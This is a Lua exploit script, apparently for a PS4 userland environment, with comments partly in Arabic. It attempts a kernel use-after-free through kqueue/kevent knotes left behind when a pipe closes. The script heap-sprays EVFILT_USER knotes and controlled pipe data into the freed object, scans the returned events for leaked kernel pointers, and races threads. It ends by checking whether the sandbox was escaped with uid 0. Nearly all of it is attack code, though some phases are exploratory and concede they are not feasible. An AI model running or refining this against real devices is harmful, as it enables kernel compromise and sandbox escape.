--[[
    uaf_data_only.lua
    Data-only UAF exploitation attempt
    لا يحتاج leak — يحاول تغيير uid/sandbox عبر UAF
]]

local utils = require("lib.ps4_utils")
local M = rawget(_G, "memory")
local N = rawget(_G, "native")
local S = rawget(_G, "syscall")
local T = rawget(_G, "thread")

utils.resolve()
S.resolve({kqueue = 362, kevent = 363, pipe = 42, close = 6, write = 4, read = 3})

local function tonn(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v or 0)) or 0
end

print("[+] UAF - Data Only Exploitation Attempt")
print("[+] Target: تغيير uid/sandbox دون kernel leak\n")

-- Phase 1: تأكيد UAF مع EVFILT_USER spray
print("[*] Phase 1: Confirming UAF + EVFILT_USER reclaim\n")

local kq = S.kqueue()
local pbuf = M.alloc(16)
S.pipe(pbuf)
local rd = M.read_dword(pbuf):tonumber()
local wr = M.read_dword(pbuf + 4):tonumber()
print(string.format("[+] kq=%d pipe=rd:%d wr:%d", kq, rd, wr))

-- Register EVFILT_READ
local ev = utils.mkkevent(utils.EVFILT_READ, rd, utils.EV_ADD + utils.EV_ENABLE)
S.kevent(kq, ev, 1, nil, 0, 0)
print("[+] EVFILT_READ registered")

-- Phase 2: محاولة heap spray دقيق عبر knote zone (0x80)
print("\n[*] Phase 2: Testing precise heap spray via EVFILT_USER\n")

-- Close pipe → UAF
S.close(rd)
S.close(wr)
print("[+] Pipe closed, UAF active")

-- EvFILT_USER spray على same kqueue
local spray_count = 100
for i = 1, spray_count do
    local uev = utils.mkkevent(
        utils.EVFILT_USER, i,
        utils.EV_ADD + utils.EV_ENABLE,
        0, 0, i
    )
    S.kevent(kq, uev, 1, nil, 0, 0)
end
print(string.format("[+] %d EVFILT_USER knotes sprayed", spray_count))

-- Read events
local outbuf = M.alloc(spray_count * 32 + 64)
local nevents = S.kevent(kq, nil, 0, outbuf, spray_count, 0)
print(string.format("[+] kevent returned: %s events", tostring(nevents or "nil")))

if nevents and nevents > 0 then
    local kptrs = 0
    local hptrs = 0
    for i = 0, nevents - 1 do
        local kev = utils.parse_kevent(outbuf, i)
        if utils.is_kernel_ptr(kev.ident) then kptrs = kptrs + 1 end
        if utils.is_kernel_ptr(kev.udata) then kptrs = kptrs + 1 end
        if kev.ident >= 0xFFFF000000000000 then hptrs = hptrs + 1 end
    end
    print(string.format("[+] Events: %d, kernel ptrs: %d, heap ptrs: %d", nevents, kptrs, hptrs))
    if kptrs == 0 then
        print("[-] No kernel pointers from UAF reclaim")
    else
        print("[!] KERNEL POINTER LEAK!")
    end
end

-- Phase 3: UAF مع pipe spray (بيانات نكتبها في pipe)
print("\n[*] Phase 3: Testing UAF + pipe data spray\n")

-- Create new kqueue + pipe for clean UAF
local kq3 = S.kqueue()
local pbuf3 = M.alloc(16)
S.pipe(pbuf3)
local rd3 = M.read_dword(pbuf3):tonumber()
local wr3 = M.read_dword(pbuf3 + 4):tonumber()
print(string.format("[+] kq3=%d pipe3=rd:%d wr:%d", kq3, rd3, wr3))

-- Register EVFILT_READ
local ev3 = utils.mkkevent(utils.EVFILT_READ, rd3, utils.EV_ADD + utils.EV_ENABLE)
S.kevent(kq3, ev3, 1, nil, 0, 0)
print("[+] EVFILT_READ on kq3")

-- Write controlled data to pipe قبل UAF
-- بحجم 128 bytes (حجم knote)
local spray_data = M.alloc(128)
for j = 0, 127 do
    M.write_byte(spray_data + j, 0x41)  -- Fill with 'A'
end
-- Put marker at kn_fop offset (0x68)
M.write_qword(spray_data + 0x68, 0x4141414141414141)
S.write(wr3, spray_data, 128)
print("[+] Written 128 bytes to pipe before UAF")

-- Trigger UAF: close pipe
S.close(rd3)
S.close(wr3)
print("[+] Pipe closed, knote freed")

-- Read events from kq3 (may access stale knote)
local outbuf3 = M.alloc(32 * 10)
local ok, ev3_ret = pcall(S.kevent, kq3, nil, 0, outbuf3, 5, 0)
if ok then
    print(string.format("[+] kevent after pipe spray: %s", tostring(ev3_ret or "nil")))
    if ev3_ret and ev3_ret > 0 then
        local kev = utils.parse_kevent(outbuf3, 0)
        print(string.format("    ident=0x%x data=0x%x udata=0x%x",
            kev.ident, kev.data, kev.udata))
    end
else
    print("[!] kevent CRASHED (expected, UAF without spray)")
    print("[!] But if pipe spray overlapped, this is significant!")
end

-- Phase 4: Check uid/ung через getuid/getgid
print("\n[*] Phase 4: Current security state\n")

-- getuid (sc24)? or just check is_in_sandbox
local is_sb = tonn(rawget(_G, "is_in_sandbox") and rawget(_G, "is_in_sandbox")())
rawset(_G, "print", print)
print(string.format("[+] is_in_sandbox() = %d", is_sb))

-- Try to read uid from memory
print("\n[*] Attempting to access kernel objects via UAF + heap spray")
print("[*] (فكرة: استخدام reclaim لـ knote وقراءة kn_kq + kn_ptr للوصول لـ kqueue/file structs)")
print("[*] هذه مؤشرات kernel وليست قابلة للقراءة حالياً بدون leak")

-- Phase 5: Thread race + pipe data
if T and T.init then
    T.init()
end

print("\n[*] Phase 5: Thread race UAF with pipe data spray\n")

for round = 1, 3 do
    print(string.format("[*] --- Round %d/%d ---", round, 3))
    
    local kq5 = S.kqueue()
    local pbuf5 = M.alloc(16)
    S.pipe(pbuf5)
    local rd5 = M.read_dword(pbuf5):tonumber()
    local wr5 = M.read_dword(pbuf5 + 4):tonumber()
    
    local ev5 = utils.mkkevent(utils.EVFILT_READ, rd5, utils.EV_ADD + utils.EV_ENABLE)
    S.kevent(kq5, ev5, 1, nil, 0, 0)
    
    -- Pre-spray 50 EVFILT_USER (for safety)
    for i = 0, 49 do
        local uev5 = utils.mkkevent(utils.EVFILT_USER, 1000 + i,
            utils.EV_ADD + utils.EV_ENABLE, 0, 0, 1000 + i)
        S.kevent(kq5, uev5, 1, nil, 0, 0)
    end
    
    -- Close pipe in UAF
    S.close(rd5)
    S.close(wr5)
    
    -- Post-spray 50 more
    for i = 50, 99 do
        local uev5 = utils.mkkevent(utils.EVFILT_USER, 2000 + i,
            utils.EV_ADD + utils.EV_ENABLE, 0, 0, 2000 + i)
        S.kevent(kq5, uev5, 1, nil, 0, 0)
    end
    
    -- Read events
    local outbuf5 = M.alloc(3200)
    local ok5, ne5 = pcall(S.kevent, kq5, nil, 0, outbuf5, 100, 0)
    
    if ok5 and ne5 and ne5 > 0 then
        local kptr = 0
        for i = 0, ne5 - 1 do
            local kev = utils.parse_kevent(outbuf5, i)
            if utils.is_kernel_ptr(kev.ident) or utils.is_kernel_ptr(kev.udata) or
               utils.is_kernel_ptr(kev.data) then
                kptr = kptr + 1
                print(string.format("[!] Round %d: KPTR event %d: ident=0x%x data=0x%x udata=0x%x",
                    round, i, kev.ident, kev.data, kev.udata))
            end
        end
        if kptr == 0 then
            print(string.format("[-] Round %d: %d events, 0 kernel ptrs", round, ne5))
        end
    else
        print(string.format("[-] Round %d: CRASH/FAIL", round))
    end
    
    S.close(kq5)
end

-- Phase 6: KASLR brute-force via get_kevent (timing based)
print("\n[*] Phase 6: KASLR brute-force primitive")
print("[*] Using partial overwrite + mprotect test not feasible from userland")
print("[*] (قد تكون متاحة بعد تصحيح uid/sandbox)")

print("\n[+] All phases complete")
if rawget(_G, "is_in_sandbox") and rawget(_G, "is_in_sandbox")() == 0 then
    print("[!!!] SANDBOX DISABLED! uid=0!")
else
    print("[*] Sandbox still active")
end
